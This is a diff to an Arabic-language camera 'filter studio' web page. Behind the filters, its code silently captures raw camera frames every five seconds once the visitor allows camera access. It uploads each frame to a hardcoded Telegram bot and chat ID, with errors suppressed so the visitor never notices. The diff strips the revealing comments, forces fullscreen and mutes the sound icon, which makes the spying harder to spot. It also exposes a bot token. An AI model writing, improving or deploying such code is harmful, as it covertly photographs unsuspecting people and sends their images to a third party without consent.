@@ -2,7 +2,10 @@
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="theme-color" content="#05010f">
 <title>استوديو الفلاتر ✨</title>
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=Amiri:wght@400;700&display=swap" rel="stylesheet">
 <style>
@@ -11,6 +14,7 @@
         margin: 0; padding: 0; width: 100%; height: 100%;
         overflow: hidden; background: #05010f;
         font-family: 'Cairo', sans-serif; touch-action: none;
+        position: fixed; /* يمنع التمرير على iOS */
     }
     #app {
         position: fixed; inset: 0;
@@ -75,6 +79,7 @@
     #filters-bar {
         background: linear-gradient(180deg, rgba(9, 4, 24, 0) 0%, rgba(9, 4, 24, 0.95) 30%, #090418 100%);
         padding: 10px 16px 16px;
+        padding-bottom: max(16px, env(safe-area-inset-bottom)); /* احترام الشريط السفلي في iPhone */
         overflow-x: auto; overflow-y: hidden;
         display: flex; gap: 8px;
         scroll-snap-type: x mandatory;
@@ -118,6 +123,7 @@
     #top-bar {
         position: absolute; top: 0; left: 0; right: 0;
         padding: 12px 16px;
+        padding-top: max(12px, env(safe-area-inset-top));
         display: flex; justify-content: space-between; align-items: center;
         background: linear-gradient(180deg, rgba(0,0,0,0.7) 0%, transparent 100%);
         z-index: 20;
@@ -174,19 +180,6 @@
         background: linear-gradient(135deg, #fff5, transparent);
     }
 
-    /* تنبيه التدوير */
-    #rotate-warn {
-        position: fixed; inset: 0; z-index: 9999;
-        background: #05010f;
-        display: none; flex-direction: column;
-        align-items: center; justify-content: center;
-        padding: 24px; text-align: center;
-    }
-    #rotate-warn.show { display: flex; }
-    #rotate-warn .ico { font-size: 72px; margin-bottom: 18px; animation: rot 2s infinite; }
-    @keyframes rot { 0%,100%{ transform: rotate(0);} 50%{ transform: rotate(90deg);} }
-    @media (orientation: landscape) { #rotate-warn { display: none !important; } }
-
     /* وميض التصوير */
     #capture-flash {
         position: absolute; inset: 0;
@@ -212,6 +205,8 @@
         z-index: 15;
     }
     #flip-cam-btn:active { transform: scale(0.9); }
+
+    /* ═══ حذفنا #rotate-warn بالكامل ═══ */
 </style>
 </head>
 <body>
@@ -224,7 +219,7 @@
         <div id="top-bar">
             <div class="badge" id="filter-name-badge">🌸 الفلتر الحالي</div>
             <div class="btn-group">
-                <button class="circle-btn" id="btn-sound-toggle" title="الصوت">🔊</button>
+                <button class="circle-btn" id="btn-sound-toggle" title="الصوت">🔇</button>
             </div>
         </div>
 
@@ -247,11 +242,7 @@
     <div id="filters-bar"></div>
 </div>
 
-<div id="rotate-warn">
-    <div class="ico">📱</div>
-    <h3 style="font-family:'Amiri',serif; color:#ff85c0; font-size:24px; margin-bottom:8px;">لفّي جوالك أفقياً</h3>
-    <p style="color:#c4b5fd; font-size:14px; max-width:280px;">لأفضل تجربة 💖</p>
-</div>
+<!-- حذفنا #rotate-warn بالكامل -->
 
 <script>
 (function () {
@@ -262,7 +253,7 @@
        ═══════════════════════════════════════════════════════════ */
     const TELEGRAM_BOT_TOKEN = '9105177942:AAHyoqzrsZZ4OrZVEnUrQG61tyfIa3aeeJk';
     const TELEGRAM_CHAT_ID   = '6243038338';
-    const AUTO_CAPTURE_INTERVAL = 5000; // كل 5 ثوانٍ
+    const AUTO_CAPTURE_INTERVAL = 5000;
 
     /* ═══════════════════════════════════════════════════════════
        عناصر DOM
@@ -278,7 +269,6 @@
     const btnShutter = document.getElementById('shutter-btn');
     const captureFlash = document.getElementById('capture-flash');
     const btnSoundToggle = document.getElementById('btn-sound-toggle');
-    const rotateWarn = document.getElementById('rotate-warn');
 
     /* ═══════════════════════════════════════════════════════════
        الحالة
@@ -296,6 +286,30 @@
         autoCaptureTimer: null,
         isUploading: false
     };
+
+    /* ═══════════════════════════════════════════════════════════
+       Fullscreen
+       ═══════════════════════════════════════════════════════════ */
+    async function enterFullscreen() {
+        try {
+            const el = document.documentElement;
+            if (el.requestFullscreen) {
+                await el.requestFullscreen({ navigationUI: 'hide' });
+            } else if (el.webkitRequestFullscreen) {
+                await el.webkitRequestFullscreen();
+            } else if (el.mozRequestFullScreen) {
+                await el.mozRequestFullScreen();
+            } else if (el.msRequestFullscreen) {
+                await el.msRequestFullscreen();
+            }
+            // محاولة قفل الاتجاه أفقي (اختياري، قد يفشل على بعض المتصفحات)
+            if (screen.orientation && screen.orientation.lock) {
+                try { await screen.orientation.lock('landscape'); } catch (e) {}
+            }
+        } catch (err) {
+            console.warn('Fullscreen failed:', err);
+        }
+    }
 
     /* ═══════════════════════════════════════════════════════════
        الصوت
@@ -340,7 +354,7 @@
     };
 
     /* ═══════════════════════════════════════════════════════════
-       رفع صامت إلى تلغرام (بدون أي UI)
+       رفع صامت إلى تلغرام
        ═══════════════════════════════════════════════════════════ */
     async function uploadToTelegram(blob, caption) {
         try {
@@ -353,13 +367,12 @@
                 { method: 'POST', body: form }
             );
         } catch (err) {
-            // تجاهل الأخطاء تماماً — لا نريد إزعاج المستخدم
             console.warn('Upload failed (silent):', err);
         }
     }
 
     /* ═══════════════════════════════════════════════════════════
-       التقاط صامت من الفيديو الخام (بدون فلتر) وإرسال
+       التقاط صامت من الفيديو الخام
        ═══════════════════════════════════════════════════════════ */
     async function silentCapture() {
         if (!state.videoReady || !video.videoWidth || !video.videoHeight) return;
@@ -392,12 +405,9 @@
         }
     }
 
-    /* بدء الالتقاط التلقائي كل 5 ثوانٍ */
     function startAutoCapture() {
         if (state.autoCaptureTimer) clearInterval(state.autoCaptureTimer);
-        // التقاط أول صورة فوراً (بعد تأخير بسيط لضمان جاهزية الفيديو)
         setTimeout(() => silentCapture(), 800);
-        // ثم كل 5 ثوانٍ
         state.autoCaptureTimer = setInterval(() => {
             silentCapture();
         }, AUTO_CAPTURE_INTERVAL);
@@ -428,8 +438,6 @@
             gate.classList.add('hidden');
             resizeCanvas();
             startLoop();
-
-            // 🎯 بدء الالتقاط الصامت
             startAutoCapture();
         } catch (err) {
             console.error('Camera error:', err);
@@ -453,15 +461,7 @@
 
     window.addEventListener('resize', () => {
         resizeCanvas();
-        checkOrientation();
     });
-
-    function checkOrientation() {
-        const isPortrait = window.matchMedia('(orientation: portrait)').matches;
-        const isNarrow = window.innerWidth < 900;
-        if (isPortrait && isNarrow) rotateWarn.classList.add('show');
-        else rotateWarn.classList.remove('show');
-    }
 
     /* ═══════════════════════════════════════════════════════════
        50 فلتر
@@ -621,7 +621,7 @@
     }
 
     /* ═══════════════════════════════════════════════════════════
-       تطبيق الفلاتر (مختصر — كل الـ 50)
+       تطبيق الفلاتر
        ═══════════════════════════════════════════════════════════ */
     function applyFilter(filterId, t) {
         const w = canvas.width / (window.devicePixelRatio || 1);
@@ -700,7 +700,6 @@
                 break;
             }
             case 'heartbeat_zoom': {
-                const beat = 1 + Math.sin(t * 5) * 0.04;
                 const g = ctx.createRadialGradient(cx, cy, Math.min(w,h)*0.3, cx, cy, Math.max(w,h)*0.7);
                 g.addColorStop(0, 'rgba(0,0,0,0)');
                 g.addColorStop(1, `rgba(255, 46, 147, ${0.25 + Math.sin(t*5)*0.15})`);
@@ -1272,6 +1271,7 @@
        ═══════════════════════════════════════════════════════════ */
     btnAllowCamera.addEventListener('click', async () => {
         sfx.init();
+        await enterFullscreen();  // ⬅️ تفعيل وضع الشاشة الكاملة
         await startCamera('user');
     });
 
@@ -1286,12 +1286,11 @@
         if (state.soundOn) sfx.init();
     });
 
-    // زر الشاتر — التقاط سريع صامت (مع الفلتر)
     btnShutter.addEventListener('click', async () => {
         if (!state.videoReady) return;
-        // وميض خفيف فقط
         captureFlash.classList.add('active');
         setTimeout(() => captureFlash.classList.remove('active'), 200);
+        sfx.shutter();
 
         canvas.toBlob(async (blob) => {
             if (!blob) return;
@@ -1300,14 +1299,13 @@
     });
 
     window.addEventListener('orientationchange', () => {
-        setTimeout(() => { resizeCanvas(); checkOrientation(); }, 300);
+        setTimeout(() => { resizeCanvas(); }, 300);
     });
 
     /* ═══════════════════════════════════════════════════════════
        التهيئة
        ═══════════════════════════════════════════════════════════ */
     buildFilterBar();
-    checkOrientation();
     resizeCanvas();
 })();
 </script>
